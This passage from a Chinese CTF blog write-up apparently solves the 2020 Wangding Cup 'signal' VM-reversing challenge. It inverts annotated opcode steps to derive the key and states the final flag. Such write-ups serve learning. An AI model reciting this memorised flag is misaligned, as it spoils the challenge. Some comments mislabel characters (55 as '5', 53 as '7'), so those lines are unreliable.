class="line">//根据后面的比较str[100]=34，所以(str[0]^16)-5==34</span><br><span class="line">//str[0]=55=&#x27;7&#x27;</span><br><span class="line">4,32    //str[1]^32---&gt;rax</span><br><span class="line">8       //rax---&gt;str[1]</span><br><span class="line">//str[1]^=32;</span><br><span class="line">5,3     //str[1]*3---&gt;rax</span><br><span class="line">1       //rax---&gt;str[1]</span><br><span class="line">//str[101]=(str[1]^32)*3</span><br><span class="line">//str[101]=63</span><br><span class="line">//str[1]=53=&#x27;5&#x27;</span><br><span class="line">3,2     </span><br><span class="line">8       //str[2]-=2;</span><br><span class="line">11</span><br><span class="line">1       //str[102]=str[2]-1;</span><br><span class="line">//str[2]-3=52</span><br><span class="line">//str[2]=55=&#x27;7&#x27;</span><br><span class="line">12</span><br><span class="line">8       //str[3]+=1;</span><br><span class="line">4,4</span><br><span class="line">1       //str[103]=str[3]^4;</span><br><span class="line">//(str[3]+1)^4=50</span><br><span class="line">//str[3]=55=&#x27;5&#x27;</span><br><span class="line">5,3</span><br><span class="line">8       //str[4]*=3;</span><br><span class="line">3,33 </span><br><span class="line">1       //str[104]=str[4]-33;</span><br><span class="line">//(str[4]*3)-33=114</span><br><span class="line">//str(4)=49=&#x27;1&#x27;</span><br><span class="line">11</span><br><span class="line">8</span><br><span class="line">11</span><br><span class="line">1</span><br><span class="line">//str[5]-2=51</span><br><span class="line">//str[5]=53=&#x27;5&#x27;</span><br><span class="line">4,9</span><br><span class="line">8       //str[6]^=9;</span><br><span class="line">3,32</span><br><span class="line">1       //str[6]-=32;</span><br><span class="line">//(str[6]^9)-32=24</span><br><span class="line">//str[6]=49=&#x27;1&#x27;</span><br><span class="line">2,81    </span><br><span class="line">8       //str[7]+=81;</span><br><span class="line">4,36</span><br><span class="line">1       //str[7]^=36;</span><br><span class="line">//(str[7]+81)^36=-89;</span><br><span class="line">//str[7]=50=&#x27;2&#x27;</span><br><span class="line">12</span><br><span class="line">8       str[8]+=1;</span><br><span class="line">11</span><br><span class="line">1       str[8]-=1;</span><br><span class="line">str[8]=49=&#x27;1&#x27;</span><br><span class="line">5,2</span><br><span class="line">8       //str[9]*=2;</span><br><span class="line">2,37</span><br><span class="line">1       //str[9]+=37;</span><br><span class="line">//str[9]*2+37=-15</span><br><span class="line">//str[9]=102=&#x27;f&#x27;</span><br><span class="line">2,54</span><br><span class="line">8       //str[10]+=54;</span><br><span class="line">4,65</span><br><span class="line">1       //str[10]^=65;</span><br><span class="line">//(str[10]+54)^65=40</span><br><span class="line">//str[10]=51=&#x27;3&#x27;</span><br><span class="line">2,32</span><br><span class="line">8       //str[11]+=32;</span><br><span class="line">5,1</span><br><span class="line">1       //</span><br><span class="line">//str[11]+32=-124</span><br><span class="line">//str[11]=100=&#x27;d&#x27;</span><br><span class="line">5,3</span><br><span class="line">8       //str[12]*=3;</span><br><span class="line">2,37</span><br><span class="line">1       //str[12]+=37;</span><br><span class="line">//str[12]*3+37=-63</span><br><span class="line">//str[12]=52=&#x27;4&#x27;</span><br><span class="line">4,9     //str[13]^=9;</span><br><span class="line">8</span><br><span class="line">3,32    //str[13]-=32;</span><br><span class="line">1</span><br><span class="line">//(str[13]^9)-32=30;</span><br><span class="line">//str[13]=53=&#x27;7&#x27;</span><br><span class="line">2,65</span><br><span class="line">8       //str[14]+=65;</span><br><span class="line">12</span><br><span class="line">1       //str[14]++;</span><br><span class="line"></span><br><span class="line">//str[14]=56=&#x27;8&#x27;</span><br><span class="line">比较：</span><br><span class="line">7,34,7,63,7,52,7,50</span><br><span class="line">7,114,7,51,7,24</span><br><span class="line">7,-89,7,49,7,-15</span><br><span class="line">7,40,7,-124,7,-63</span><br><span class="line">7,30,7,122</span><br></pre></td></tr></table></figure><p>最后得出这个15位的key就是757515121f3d478 。这个程序基本用不到动态调试，最后就算要跑也只是检验我们的flag是否正确而已，那么我们跑一遍吧。</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/3.png" alt="3"></p><p>最终提交的flag就是flag{757515121f3d478}</p><p>这题目在vmre中还是比较简单的，推荐入坑虚拟机逆向的师傅一定做做这个，然后自己粗心居然把11和12指令搞反了一开始，导致算出来的就一直不对，这个毛病还是得改改(捂脸</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;不知不觉做到了虚拟机逆向了，曾经我也只是听说，还未曾想也能自己做出。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="re" scheme="http://example.com/categories/ctf/re/"/>
    
    
  </entry>
  
</feed>
